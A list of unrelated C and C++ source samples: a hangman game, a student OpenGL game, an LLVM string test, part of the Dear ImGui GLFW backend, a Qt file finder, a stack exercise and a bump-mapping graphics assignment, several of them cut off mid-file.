    "#include <stdio.h>\n#include <stdlib.h>\n#include <conio.h>\n#include <string.h>\n#include <time.h>\n#include <windows.h>\n\nchar mot[25],mot2[25],error[51];\nint i,j,pendu=0,difficulty,taille_max,hints,coef_score,taille,error_count=0,gamemode;\nchar c;\nint fin=0; char v;\n\ntypedef struct{\n\tchar pseudo_nom[50];\n\tint score;\t\n\tint match_jouer;\n\tint gagne;\n\tint perdu;\n\tfloat taux_de_reussite;\n}joueur;\n\nstruct detail_mot{\n\tchar indice[100];\n\tint aidable;\n};\nstruct detail_mot detail;\n\nvoid title(char titre[], char sous_titre[]){\n\tprintf(\"\\n\\n\\n\\n\\t\\t\\t\\t\\t ---------------------------------\\n\");\t\n\tprintf(\"\\n\\n\\t\\t\\t\\t\\t               %s          \\n\",titre);\n\tprintf(\"\\n\\n\\t\\t\\t\\t\\t ---------------------------------\\n\");\n\tprintf(\"\\n\\n\\t\\t\\t\\t\\t     %s\",sous_titre);\t\n}\n\nint pseudo_nom_existe(char nom_joueur1[], FILE *mon_fichier1){\n\tjoueur personne1;\n\tmon_fichier1=fopen(\"filependu.txt\",\"r\");\n\twhile(!feof(mon_fichier1))\n\t\t\t{\n\t\t\t\tfscanf(mon_fichier1,\"%s\",&personne1.pseudo_nom);\n\t\t\t\tif(strcmp(nom_joueur1,personne1.pseudo_nom)==0)\n\t\t\t\t{\t\n\t\t\t\t\tsystem(\"cls\");\n\t\t\t\t\tprintf(\"\\n\\n\\t\\t\\t\\t    pardon, ce joueur d%cja il existe, r%cssayer\\n\", 130, 130);\n\t\t\t\t\treturn(1);\n\t\t\t\t}\n\t\t\t}\n}\n\nvoid echange_score(FILE *mon_fichier_e, char nom_joueur11[], int score_total, int match_jouer1, int match_gagne1, int match_perdu1, int pourcentage){\n\tFILE *file;\n\tjoueur personne11;\n\tpersonne11.match_jouer=match_jouer1;\n\tpersonne11.gagne=match_gagne1;\n\tpersonne11.perdu=match_perdu1;\n\tpersonne11.taux_de_reussite=pourcentage;\n\tfile=fopen(\"fichier_temp.txt\",\"a\");\n\tfprintf(file,\"%s %d %d %d %d %f\\n\", nom_joueur11, score_total, personne11.match_jouer, personne11.gagne, personne11.perdu, personne11.taux_de_reussite);\n\tfclose(file);\n\tmon_fichier_e=fopen(\"filependu.txt\",\"r\");\t\n\tfile=fopen(\"fichier_temp.txt\",\"a\");\n\twhile(!feof(mon_fichier_e)){\n\t\tfscanf(mon_fichier_e,\"%s %d %d %d %d %f\",&personne11.pseudo_nom, &personne11.score, &personne11.match_jouer, &personne11.gagne, &personne11.perdu, &personne11.taux_de_reussite);\n\t\tif(strcmp(personne11.pseudo_nom,nom_joueur11)!=0){\n\t\t\tfprintf(file,\"%s %d %d %d %d %f\\n\",personne11.pseudo_nom, personne11.score, personne11.match_jouer, personne11.gagne, personne11.perdu, personne11.taux_de_reussite);\n\t\t}\n\t}\n\tfclose(mon_fichier_e);\n\tfclose(file);\n\tremove(\"filependu.txt\");\n\trename(\"fichier_temp.txt\",\"filependu.txt\");\n}\n\nint trouver(FILE *fichier, char nom[])\n{\n\tjoueur person;\n\tfichier=fopen(\"filependu.txt\",\"r\");\n\t\twhile(!feof(fichier))\n\t\t{\n\t\t\tfscanf(fichier,\"%s %d %d %d %d %f\",&person.pseudo_nom, &person.score, &person.match_jouer, &person.gagne, &person.perdu, &person.taux_de_reussite);\n\t\t\tif(strcmp(person.pseudo_nom,nom)==0)\n\t\t\t{\n\t\t\t\tfclose(fichier);\n\t\t\t\treturn(1);\n\t\t\t}\n\t\t}\n\t\treturn(0);\n}\n\nvoid Color(int couleurDuTexte,int couleurDeFond){\n        HANDLE H=GetStdHandle(STD_OUTPUT_HANDLE);\n        SetConsoleTextAttribute(H,couleurDeFond*16+couleurDuTexte);\n}\n\nvoid clear_file(char nom_fich[],int value_def){\n\tFILE* f;\n\tf=fopen(nom_fich,\"w\");\n\tfprintf(f,\"%d\",value_def);\n\tfclose(f);\n}\n\nint random(int sup,int inf){\n\tint h, min, s, day, mois, an;\n\ttime_t now;\n\ttime(&now);\n\tstruct tm *local = localtime(&now);\n\tmin = local->tm_min;       \n\ts = local->tm_sec;\n\tan = local->tm_year;\n\tint randed=sup-(rand()*s)%sup;\n\twhile(randed<inf) randed+=9;\n\treturn randed;\n}\n\nint test_file(void){\n\tint var_test;\n\tFILE *f=fopen(\"apend.txt\",\"r\");\n\t\tfscanf(f,\"%d\",&var_test);\n\t\tfclose(f);\n\tif(var_test<16 && var_test >-1) return 1;\n\telse return 0;\n}\n\nvoid enregistrement(void){\n\tfor(i=0;detail.indice[i]!='\\0';i++)if(detail.indice[i]==' ') detail.indice[i]='_';\n\tif(error[0]==0 || error[0]=='\\0') error[0]='_';\n\tFILE* fichier=fopen(\"apend.txt\",\"w\");\n\t//fprintf(fichier,\"%d\\n%d\\n%s\\n%s\\n%s\",gamemode,difficulty,mot,error,mot2);\n\tif(detail.indice[0]=='0' || detail.indice[0]=='\\0') detail.indice[0]='_';\n\tfprintf(fichier,\"%d\\n%d\\n%d\\n%d\\n%d\\n%d\\n%d\\n%d\\n%d\\n%s\\n%s\\n%s\\n%s\",pendu,difficulty,taille_max,hints,coef_score,taille,error_count,gamemode,detail.aidable,detail.indice,mot,mot2,error);\n\tfclose(fichier);\n\tfor(i=0;detail.indice[i]!='\\0';i++)if(detail.indice[i]=='_') detail.indice[i]=' ';\n\tif(error[0]=='_') error[0]=0;\n}\n\nvoid chargement(void){\n\tFILE* fichier=fopen(\"apend.txt\",\"r\");\n\tfscanf(fichier,\"%d\\n%d\\n%d\\n%d\\n%d\\n%d\\n%d\\n%d\\n%d\\n%s\\n%s\\n%s\\n%s\",&pendu,&difficulty,&taille_max,&hints,&coef_score,&taille,&error_count,&gamemode,&detail.aidable,detail.indice,mot,mot2,error);\n\tfclose(fichier);\n\tfor(i=0;detail.indice[i]!='\\0';i++)if(detail.indice[i]=='_') detail.indice[i]=' ';\n\tif(error[0]=='_') error[0]=0;\n}\n\nvoid creer_mot2(void){\n\tfor(i=0;i<taille;i++){\n\t\t\tmot2[i]=4; // 4: code ascii\n\t\t}\n}\n\nvoid proposer_mot(void){\n\tchar indice_1[50]={\"Ce mot est un fruit!\"};\n\tchar indice_2[50]={\"Ce mot est un pays!\"};\n\tchar indice_3[50]={\"Ce mot est une equipe de football!\"};\n\tchar indice_4[50]={\"Ce mot est une propriete html/css!\"};\t\n\tchar indice_5[50]={\"Ce mot est un verbe du 1er groupe!\"};\n\tchar indice_6[50]={\"Ce mot est un mobilier domestique!\"};\n\tchar file_name[30]={\"Propositions/",
    "/***\nNAME SURNAME : Duygu Abbasoglu\nSTUDENT ID : 22102978\nSECTION : 03\nHOMEWORK : #2\n*My project displays a game simulation, rocket hits the harts and fight with monsters\n\nPROBLEMS :\nADDITIONAL FEATURES:\n    * 100 random star is created for the background of the game, their locations and sizes are different\n    *\n    * 5 hearts that have different speeds and directions added. If any of the hearts removed from the screen or land on the ground, a new heart is created\n\n    *  If user cannot shoot a heart until it lands on the ground, an pacman is created at the position of the landed heart. They have different speeds and directions\n\n    * Points are awarded for each successful shot, with a live score and remaining time displayed on the screen. The time is formatted in seconds and milliseconds to enhance the sense of urgency.\n            An additional function is added to show the remaining milliseconds\n\n    * If the number of pacman monsters reach 3, the game ends\n\n    * In addition to up, down,left and right special keys, cannon weapon can move using 'a' and'd' keys\n\n    * In addition to F1, 'r' key also restart the game even after the game starts\n\n    * Before starting the game and after pausing the game, new bullets cannot be launched\n\n    * Ammo is limited by 10 bullets. After the bullets finish, ammo is refilled\n\n    * Collected points are counted until the game is over. Each succesful shot gains depend on the heart position, if it is on the center, it takes 1 points and increases with widht\n    *\n    * A proper beggining and ending messages are displayed at the rightside of the outer screen\n\n    * Program terminates when ESC key is pressed\n\n*****/\n\n#include <GL/glut.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdarg.h>\n#include <time.h>\n\n#define WINDOW_WIDTH  800\n#define WINDOW_HEIGHT 600\n\n#define TIMER_PERIOD   20 //period for the timer\n#define TIMER_ON        1 //0:disable timer, 1:enable timer\n\n#define D2R 0.0174532\n#define PI 3.14159265358979323846\n\n\n/* Global Variables for Template File */\n\nbool up = false, down = false, right = false, left = false;\nint  winWidth, winHeight; //current Window width and height\n\nbool timeract = false;\n\nbool active = false;\nint counter = 0;\n\n\n//game variables\nbool  gameover = false, gamepaused = false;\n\n//collecting points\nchar s[10] = \"\";\nint point = 0;\n\nfloat heart[5][4];\nvoid inithearts() {\n\n    for (int i = 0; i < 5; i++) {\n        heart[i][0] = 1;\n        heart[i][1] = rand() % 601 - 300;\n        heart[i][2] = 450;\n        heart[i][3] = (rand() % 5 + 4) / 50.0;\n    }\n}\n\n\nfloat xt = -100, yt = -220, vt = 9; // cannon movement in each time\n\nfloat pacmanmonster[3][4] = { {0, 25, -175, (rand() % 5 + 2) / 5.},\n                      {0, 25, -175, (rand() % 5 + 2) / 5.},\n                      {0, 25, -175, (rand() % 5 + 2) / 5.} }; //visibiliy, x, y, speed\nint currentpacmanmonster = 0;\n\nint bullet[10][3] = { {0},{0},{0},{0},{0},{0},{0},{0},{0},{0} }; //moving action, x, y, speed\nint currentbullet = 0;\nfloat vf = 7;\nint deadbullet = 0;\n\n// geometric shapes\nvoid circle(int x, int y, int r) {\n#define PI 3.1415\n    float angle;\n    glBegin(GL_POLYGON);\n    for (int i = 0; i < 100; i++) {\n        angle = 2 * PI * i / 100;\n        glVertex2f(x + r * cos(angle), y + r * sin(angle));\n    }\n    glEnd();\n}\n\nvoid drawhalfcircle(int cx, int cy, int r) {\n    glBegin(GL_POLYGON);\n    for (int i = 180; i < 360; i++) {\n        float theta = i * PI / 180;\n        glVertex2f(cx + r * cos(theta), cy + r * sin(theta));\n    }\n    glEnd();\n}\n\nvoid print(int x, int y, const char* string, void* font) {\n    int len, i;\n\n    glRasterPos2f(x, y);\n    len = (int)strlen(string);\n    for (i = 0; i < len; i++) {\n        glutBitmapCharacter(font, string[i]);\n    }\n}\n\n/***\n   to display text with variables\nvprint(-winWidth / 2 + 10, winHeight / 2 - 20, GLUT_BITMAP_8_BY_13, \"ERROR: %d\", numClicks);\n***/\nvoid vprint(int x, int y, void* font, const char* string, ...) {\n    va_list ap;\n    va_start(ap, string);\n    char str[1024];\n    vsprintf_s(str, string, ap);\n    va_end(ap);\n\n    int len, i;\n    glRasterPos2f(x, y);\n    len = (int)strlen(str);\n    for (i = 0; i < len; i++) {\n        glutBitmapCharacter(font, str[i]);\n    }\n}\n\nvoid vprint2(int x, int y, float size, const char* string, ...) {\n    va_list ap;\n    va_start(ap, string);\n    char str[1024];\n    vsprintf_s(str, string, ap);\n    va_end(ap);\n    glPushMatrix();\n    glTranslatef(x, y, 0);\n    glScalef(size, size, 1);\n\n    int len, i;\n    len = (int)strlen(str);\n    for (i = 0; i < len; i++) {\n        glutStrokeCharacter(GLUT_STROKE_ROMAN, str[i]);\n    }\n    glPopMatrix();\n}\n\n\n\n\n//showing remining millisec in each fps\n\nint msec(int x) {\n    if (x == 100) { return 00; }\n    else { return x; }\n}\n\n\n\n// background\n\nvoid drawgradienttheme(int x1, int y1, int w, int h, float r, float g, float b) {\n\n    glBegin(GL_QUADS);\n    glColor3f(r, g, b);\n    glVertex2f(x1, y1);\n    glVertex2f(x1 + w",
    "//===----------------------------------------------------------------------===//\n//\n// Part of the LLVM Project, under the Apache License v2.0 with LLVM Exceptions.\n// See https://llvm.org/LICENSE.txt for license information.\n// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception\n//\n//===----------------------------------------------------------------------===//\n// UNSUPPORTED: c++03, c++11, c++14, c++17, c++20\n\n// <string>\n\n// constexpr bool contains(basic_string_view x) const noexcept;\n\n#include <string>\n#include <cassert>\n\n#include \"test_macros.h\"\n\nconstexpr bool test()\n{\n    using S = std::string;\n    using SV = std::string_view;\n\n    const char* s = \"abcde\";\n    S s0;\n    S s1 {s + 1, 1};\n    S s3 {s + 1, 3};\n    S s5 {s    , 5};\n    S sNot {\"xyz\", 3};\n\n    SV sv0;\n    SV sv1 {s + 1, 1};\n    SV sv2 {s + 1, 2};\n    SV sv3 {s + 1, 3};\n    SV sv4 {s + 1, 4};\n    SV sv5 {s    , 5};\n    SV svNot  {\"xyz\", 3};\n    SV svNot2 {\"bd\" , 2};\n    SV svNot3 {\"dcb\", 3};\n\n    ASSERT_NOEXCEPT(s0.contains(sv0));\n\n    assert( s0.contains(sv0));\n    assert(!s0.contains(sv1));\n\n    assert( s1.contains(sv0));\n    assert( s1.contains(sv1));\n    assert(!s1.contains(sv2));\n    assert(!s1.contains(sv3));\n    assert(!s1.contains(sv4));\n    assert(!s1.contains(sv5));\n    assert(!s1.contains(svNot));\n    assert(!s1.contains(svNot2));\n    assert(!s1.contains(svNot3));\n\n    assert( s3.contains(sv0));\n    assert( s3.contains(sv1));\n    assert( s3.contains(sv2));\n    assert( s3.contains(sv3));\n    assert(!s3.contains(sv4));\n    assert(!s3.contains(sv5));\n    assert(!s3.contains(svNot));\n    assert(!s3.contains(svNot2));\n    assert(!s3.contains(svNot3));\n\n    assert( s5.contains(sv0));\n    assert( s5.contains(sv1));\n    assert( s5.contains(sv2));\n    assert( s5.contains(sv3));\n    assert( s5.contains(sv4));\n    assert( s5.contains(sv5));\n    assert(!s5.contains(svNot));\n    assert(!s5.contains(svNot2));\n    assert(!s5.contains(svNot3));\n\n    assert( sNot.contains(sv0));\n    assert(!sNot.contains(sv1));\n    assert(!sNot.contains(sv2));\n    assert(!sNot.contains(sv3));\n    assert(!sNot.contains(sv4));\n    assert(!sNot.contains(sv5));\n    assert( sNot.contains(svNot));\n    assert(!sNot.contains(svNot2));\n    assert(!sNot.contains(svNot3));\n\n    return true;\n}\n\nint main(int, char**)\n{\n  test();\n  static_assert(test());\n\n  return 0;\n}\n",
    "// dear imgui: Platform Backend for GLFW\n// This needs to be used along with a Renderer (e.g. OpenGL3, Vulkan, WebGPU..)\n// (Info: GLFW is a cross-platform general purpose library for handling windows, inputs, OpenGL/Vulkan graphics context creation, etc.)\n// (Requires: GLFW 3.1+. Prefer GLFW 3.3+ or GLFW 3.4+ for full feature support.)\n\n// Implemented features:\n//  [X] Platform: Clipboard support.\n//  [X] Platform: Mouse support. Can discriminate Mouse/TouchScreen/Pen (Windows only).\n//  [X] Platform: Keyboard support. Since 1.87 we are using the io.AddKeyEvent() function. Pass ImGuiKey values to all key functions e.g. ImGui::IsKeyPressed(ImGuiKey_Space). [Legacy GLFW_KEY_* values are obsolete since 1.87 and not supported since 1.91.5]\n//  [X] Platform: Gamepad support. Enable with 'io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad'.\n//  [X] Platform: Mouse cursor shape and visibility (ImGuiBackendFlags_HasMouseCursors). Resizing cursors requires GLFW 3.4+! Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange'.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// About Emscripten support:\n// - Emscripten provides its own GLFW (3.2.1) implementation (syntax: \"-sUSE_GLFW=3\"), but Joystick is broken and several features are not supported (multiple windows, clipboard, timer, etc.)\n// - A third-party Emscripten GLFW (3.4.0) implementation (syntax: \"--use-port=contrib.glfw3\") fixes the Joystick issue and implements all relevant features for the browser.\n// See https://github.com/pongasoft/emscripten-glfw/blob/master/docs/Comparison.md for details.\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2024-08-22: moved some OS/backend related function pointers from ImGuiIO to ImGuiPlatformIO:\n//               - io.GetClipboardTextFn    -> platform_io.Platform_GetClipboardTextFn\n//               - io.SetClipboardTextFn    -> platform_io.Platform_SetClipboardTextFn\n//               - io.PlatformOpenInShellFn -> platform_io.Platform_OpenInShellFn\n//  2024-07-31: Added ImGui_ImplGlfw_Sleep() helper function for usage by our examples app, since GLFW doesn't provide one.\n//  2024-07-08: *BREAKING* Renamed ImGui_ImplGlfw_InstallEmscriptenCanvasResizeCallback to ImGui_ImplGlfw_InstallEmscriptenCallbacks(), added GLFWWindow* parameter.\n//  2024-07-08: Emscripten: Added support for GLFW3 contrib port (GLFW 3.4.0 features + bug fixes): to enable, replace -sUSE_GLFW=3 with --use-port=contrib.glfw3 (requires emscripten 3.1.59+) (https://github.com/pongasoft/emscripten-glfw)\n//  2024-07-02: Emscripten: Added io.PlatformOpenInShellFn() handler for Emscripten versions.\n//  2023-12-19: Emscripten: Added ImGui_ImplGlfw_InstallEmscriptenCanvasResizeCallback() to register canvas selector and auto-resize GLFW window.\n//  2023-10-05: Inputs: Added support for extra ImGuiKey values: F13 to F24 function keys.\n//  2023-07-18: Inputs: Revert ignoring mouse data on GLFW_CURSOR_DISABLED as it can be used differently. User may set ImGuiConfigFLags_NoMouse if desired. (#5625, #6609)\n//  2023-06-12: Accept glfwGetTime() not returning a monotonically increasing value. This seems to happens on some Windows setup when peripherals disconnect, and is likely to also happen on browser + Emscripten. (#6491)\n//  2023-04-04: Inputs: Added support for io.AddMouseSourceEvent() to discriminate ImGuiMouseSource_Mouse/ImGuiMouseSource_TouchScreen/ImGuiMouseSource_Pen on Windows ONLY, using a custom WndProc hook. (#2702)\n//  2023-03-16: Inputs: Fixed key modifiers handling on secondary viewports (docking branch). Broken on 2023/01/04. (#6248, #6034)\n//  2023-03-14: Emscripten: Avoid using glfwGetError() and glfwGetGamepadState() which are not correctly implemented in Emscripten emulation. (#6240)\n//  2023-02-03: Emscripten: Registering custom low-level mouse wheel handler to get more accurate scrolling impulses on Emscripten. (#4019, #6096)\n//  2023-01-04: Inputs: Fixed mods state on Linux when using Alt-GR text input (e.g. German keyboard layout), could lead to broken text input. Revert a 2022/01/17 change were we resumed using mods provided by GLFW, turns out they were faulty.\n//  2022-11-22: Perform a dummy glfwGetError() read to cancel missing names with glfwGetKeyName(). (#5908)\n//  2022-10-18: Perform a dummy glfwGetError() read to cancel missing mouse cursors errors. Using GLFW_VERSION_COMBINED directly. (#5785)\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2022-09-26: In",
    "#include <QCoreApplication>\n#include <QDirIterator>\n#include <QRegularExpression>\n#include <QDebug>\n#include <QProcess>\n#include <iostream>\n\n\nvoid searchFileNames(const QString &path, const QRegularExpression &pattern, QStringList &fileList) {\n\n    // Create directory iterator\n    QDirIterator it(path, QDir::Files | QDir::NoDotAndDotDot, QDirIterator::Subdirectories);\n\tuint number = 1;\n\n    // Iterate through files\n    while (it.hasNext()) {\n        QString filePath = it.next();                 // Full file path\n        QString fileName = it.fileName();             // Only file name\n\n        if (pattern.match(fileName).hasMatch()) {     // Match file name against regex\n            qWarning() << number << filePath;                     // Print matching file path\n            fileList.append(filePath);\n\t\t\tnumber++;\n        }\n    }\n}\n\nint main(int argc, char *argv[]) {\n    QCoreApplication app(argc, argv);\n\n    // Command-line arguments\n    QStringList args = app.arguments();\n\n    if (args.size() < 1) {\n        qCritical() << \"Usage: fs <pattern>\";\n        return 1;\n    }\n\n    // Get arguments\n    QString patternStr = args[1];                     // Regular expression pattern\n    QString directory = \".\";                      // Directory to search\n\n    // Compile regex pattern\n\tQRegularExpression pattern(patternStr, QRegularExpression::CaseInsensitiveOption);\n    if (!pattern.isValid()) {\n        qCritical() << \"Invalid regular expression:\" << patternStr;\n        return 1;\n    }\n\n    // Perform search\n    QStringList fileList;\n    searchFileNames(directory, pattern, fileList); // Check if any files were found\n\n        if (fileList.isEmpty()) {\n        qWarning() << \"No matching files found.\";\n        return 0;\n    }\n\n    // Prompt user for input\n    qInfo() << \"Enter a number (1 -\" << fileList.size() << \") to open a file, or 0 to exit:\";\n\n    int choice = 0;\n    std::cin >> choice;\n\n    if (choice > 0 && choice <= fileList.size()) {\n        // Open the selected file\n        QString fileToOpen = fileList[choice - 1];\n        qInfo() << \"Opening file:\" << fileToOpen;\n\n        // Extract the file extension\n        QString extension = fileToOpen.section('.', -1).toLower(); // Get text after the last '.'\n        qDebug() << extension;\n\n        // Check if the extension is 'pptx'\n        if (extension == \"pptx\") {\n            // Open with LibreOffice\n            QProcess::startDetached(\"libreoffice\", QStringList() << fileToOpen);\n        } else {\n            // Open with the default application\n            QProcess::startDetached(\"xdg-open\", QStringList() << fileToOpen);\n        }    } else if (choice != 0) {\n        qWarning() << \"Invalid selection.\";\n    }\n\n    return 0;\n}\n",
    "\r\n#include <iostream>\r\nusing namespace std;\r\n\r\nclass stack\r\n{\r\n    public:\r\n    int n;\r\n    int *arr;\r\n    int top;\r\n    stack(int val)\r\n    {\r\n        n=val;\r\n        arr=new int[n];\r\n        top=-1;\r\n    }\r\n    void push(int value)\r\n    {\r\n        if(top>=n-1)\r\n        {\r\n            cout<<\"stack overflow\"<<endl;\r\n        }\r\n        else\r\n        {\r\n            top++;\r\n            arr[top]=value;\r\n        }\r\n    }\r\n    \r\n    void pop()\r\n    {\r\n        if(top==-1)\r\n        {\r\n            cout<<\"stack underflow\"<<endl;\r\n        }\r\n        else\r\n        {\r\n            cout<<\"Popped :\"<<arr[top]<<endl;\r\n            top--;\r\n        }\r\n    }\r\n    \r\n    void display()\r\n    {\r\n        if(top==-1)\r\n        {\r\n            cout<<\"stack is empty\"<<endl;\r\n        }\r\n        else\r\n        {\r\n            cout<<\"The elements are \"<<endl;\r\n            for (int i=top;i > -1;i-- )\r\n            {\r\n                cout<<arr[i]<<\" \";\r\n            }\r\n            cout<<endl;\r\n        }\r\n    }\r\n    \r\n    void stackTop()\r\n    {\r\n        if(top==-1)\r\n        {\r\n            cout<<\"stack is empty\"<<endl;\r\n        }\r\n        else\r\n        {\r\n            cout<<\"Top= \"<<arr[top]<<endl;\r\n        }\r\n    }\r\n    \r\n    void emptyStack()\r\n    {\r\n        if(top==-1)\r\n        {\r\n            cout <<\" Stack is empty\"<<endl;\r\n        }\r\n        else\r\n        {\r\n            cout<<\" Stack is not empty\"<<endl;\r\n        }\r\n    }\r\n    \r\n    void fullStack()\r\n    {\r\n        if(top>=n-1)\r\n        {\r\n            cout<<\"stack is full\"<<endl;\r\n        }\r\n        else\r\n        {\r\n            cout<<\"stack is not full\"<<endl;\r\n        }\r\n    }\r\n    \r\n    void stackCount()\r\n    {\r\n        if(top==-1)\r\n        {\r\n            cout<<\"stack is empty\"<<endl;\r\n        }\r\n        else\r\n        {\r\n            cout<<\"Count= \"<<top+1<<endl;\r\n        }\r\n    }\r\n    \r\n    void search(int target)\r\n    {\r\n        bool found=false;\r\n        if(top==-1)\r\n        {\r\n            cout<<\"stack is empty\"<<endl;\r\n        }\r\n        else\r\n        {\r\n            for(int i=top;i>=0;i--)\r\n            {\r\n                if(arr[i]==target)\r\n                {\r\n                    found=true;\r\n                    cout<<\"Found\"<<endl;\r\n                }\r\n            }\r\n            if(found==false)\r\n            {\r\n                cout<<\"the element is not found\"<<endl;\r\n            }\r\n        }\r\n    }\r\n};\r\n\r\nint main()\r\n{\r\n    int maxsize;\r\n    cout<<\"enter max size of the stack\"<<endl;\r\n    cin>>maxsize;\r\n    stack s(maxsize);\r\n    int x;\r\n    cout<<\"1.Push 2.Pop 3.Display 4.Top 5.Empty 6.Full 7.Count 8.Search 0.Exit  \";\r\n    do{\r\n        cin>>x;\r\n        switch(x)\r\n        {\r\n            case 1:\r\n            {\r\n                int data;\r\n                cout<<\"enter element to push\"<<endl;\r\n                cin>>data;\r\n                s.push(data);\r\n                break;\r\n            }\r\n            case 2:\r\n            {\r\n                s.pop();\r\n                break;\r\n            }\r\n            case 3:\r\n            {\r\n                s.display();\r\n                break;\r\n            }\r\n            case 4:\r\n            {\r\n                s.stackTop();\r\n                break;\r\n            }\r\n            case 5:\r\n            {\r\n                s.emptyStack();\r\n                break;\r\n            }\r\n            case 6:\r\n            {\r\n                s.fullStack();\r\n                break;\r\n            }\r\n            case 7:\r\n            {\r\n                s.stackCount();\r\n                break;\r\n            }\r\n            \r\n            case 8:\r\n            {\r\n                int data;\r\n                cout<<\"enter element to search:\"<<endl;\r\n                cin>>data;\r\n                s.search(data);\r\n                break;\r\n            }\r\n            case 0:\r\n                cout<<\"Exit\"<<endl;\r\n                break;\r\n            \r\n        }\r\n    }while(x!=0);\r\n    return 0;\r\n}\r\n\r\n",
    "// Author: Nadezhda Chernova\r\n// File: Assn-5-SmoothMesh.cpp\r\n// Date: 11/04/2024\r\n// Texture-map and bumpy map a mesh\r\n\r\n#include <glad.h>     // GL loader\r\n#include <glfw3.h>    // GL toolkit (create window + rendering context for it)\r\n#include \"GLXtras.h\"  // convenience routines\r\n#include \"VecMat.h\"   // library for vector/matrix operations\r\n#include \"Camera.h\"   // camera class\r\n#include \"Draw.h\"     // Screen drawing, Star\r\n#include \"IO.h\"       // ReadTexture\r\n#include \"Widgets.h\"  // Mover\r\n#include <vector>     // Dynamic arrays for mesh\r\n\r\n// GPU identifiers\r\nGLuint VAO = 0, VBO = 0, EBO = 0;    // vertex array, vertex buffer, element buffer\r\nGLuint program = 0;                  // shader program ID\r\n\r\n// display\r\nint winWidth = 800, winHeight = 800;\r\nCamera camera(0, 0, winWidth, winHeight, vec3(15, -15, 0), vec3(0, 0, -5), 30);\r\n\r\n// dynamic arrays to read OBJ mesh file\r\nvector<vec3> points;    // vertex locations\r\nvector<vec3> normals;   // surface normals\r\nvector<vec2> uvs;       // texture coordinates\r\nvector<int3> triangles; // triplets of vertex indices\r\n\r\n// OBJ filename\r\nconst char *objFilename = \"/Users/nadin/Documents/Graphics/Apps/Assets/pear.obj\";\r\n\r\n// bump map filename, GL identifiers\r\nconst char *bumpFilename = \"/Users/nadin/Documents/Graphics/Apps/Assets/pear_bump.jpg\";\r\nGLuint bumpName = 0;\r\nint bumpUnit = 1;\r\n\r\n// texture image\r\nconst char *textureFilename =\r\n        \"/Users/nadin/Documents/Graphics/Apps/Assets/pear_color.jpg\";\r\nGLuint textureName = 0; // id for texture image, set by ReadTexture\r\nint textureUnit = 0; // id for GPU image buffer, may be freely set\r\n\r\n// movable lights\r\nvec3 lights[] = {{.5, 0, 1},\r\n                 {1,  1, 0}};\r\nconst int nLights = sizeof(lights) / sizeof(vec3);\r\n\r\n// interaction\r\nvoid *picked = NULL;    // if non-null: light or camera\r\nMover mover;\r\n\r\n// Shaders\r\nconst char *vertexShader = R\"(\r\n\t#version 330\r\n\tin vec3 point;\r\n    in vec3 normal;\r\n\tin vec2 uv;\r\n\r\n\tout vec3 vPoint;\r\n\tout vec2 vUv;\r\n    out vec3 vNormal;\r\n\tuniform mat4 modelview, persp;\r\n\r\n\tvoid main() {\r\n\t\tvPoint = (modelview * vec4(point, 1)).xyz;\r\n        vNormal = (modelview * vec4(normal,0)).xyz;\r\n\t\tgl_Position = persp * vec4(vPoint, 1);\r\n\t\tvUv = uv;\r\n\t}\r\n)\";\r\n\r\nconst char *pixelShader = R\"(\r\n\t#version 330\r\n\tin vec3 vPoint;\r\n\tin vec2 vUv;\r\n    in vec3 vNormal;\r\n\tout vec4 pColor;\r\n\tuniform sampler2D textureImage;\r\n    uniform sampler2D bumpMap;\r\n\tuniform int nLights = 0;\r\n\tuniform vec3 lights[20];\r\n\tuniform float amb = .1, dif = .8, spc =.7; // ambient, diffuse, specular\r\n\tvoid main() {\r\n        vec3 N = normalize(vNormal); // (Z) unit-length normal\r\n\r\n        vec3 dx = dFdx(vPoint), dy = dFdy(vPoint);\r\n        vec2 du = dFdx(vUv), dv = dFdy(vUv);\r\n        vec3 U = normalize(du.x * dx + du.y * dy); // (X)\r\n        vec3 V = normalize(dv.x * dx + dv.y * dy); // (Y)\r\n\r\n        vec4 bTex = texture(bumpMap, vUv);\r\n        vec3 b = vec3(1.5 * (2 * bTex.r-1), 1.5 *(2 * bTex.g-1), bTex.b);\r\n        vec3 BN = normalize(b.x * U + b.y * V + b.z * N);\r\n\r\n        vec3 E = normalize(vPoint);\t// eye vector\r\n        float d = 0, s = 0;\r\n\t\tfor (int i = 0; i < nLights; i++) {\r\n\t\t\tvec3 L = normalize(lights[i]-vPoint);\t// light vector\r\n\t\t\tvec3 R = reflect(L, BN);\t\t\t\t// highlight vector\r\n\t\t\td += max(0, dot(BN, L));\t\t\t\t// one-sided diffuse\r\n\t\t\tfloat h = max(0, dot(R, E));\t\t\t// highlight term\r\n\t\t\ts += pow(h, 100);\t\t\t\t\t\t// specular term\r\n\t\t}\r\n\t\tfloat ads = clamp(amb + dif*d + spc*s, 0, 1);\r\n\t\tpColor = vec4(ads * texture(textureImage, vUv).rgb, 1);\r\n\t}\r\n)\";\r\n\r\n// Display\r\nvoid Display(GLFWwindow *w) {\r\n    // z-buffer to avoid self-obscure of 3d object\r\n    glClear(GL_DEPTH_BUFFER_BIT);\r\n    glEnable(GL_DEPTH_TEST);\r\n\r\n    // clear background\r\n    glClearColor(1, 1, 1, 1); // set background to white\r\n    glClear(GL_COLOR_BUFFER_BIT); // clear screen\r\n\r\n    // access GPU buffers, activate shader program\r\n    glUseProgram(program);\r\n    glBindBuffer(GL_ARRAY_BUFFER, VBO);\r\n    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, EBO);\r\n\r\n    // set pointers\r\n    VertexAttribPointer(program, \"point\", 3, 0, (void *) 0);\r\n    VertexAttribPointer(program, \"uv\", 2, 0,\r\n                        (void *) (points.size() * sizeof(vec3)));\r\n    VertexAttribPointer(program, \"normal\", 3, 0,\r\n                        (void *) ((points.size() * sizeof(vec3)) +\r\n                                 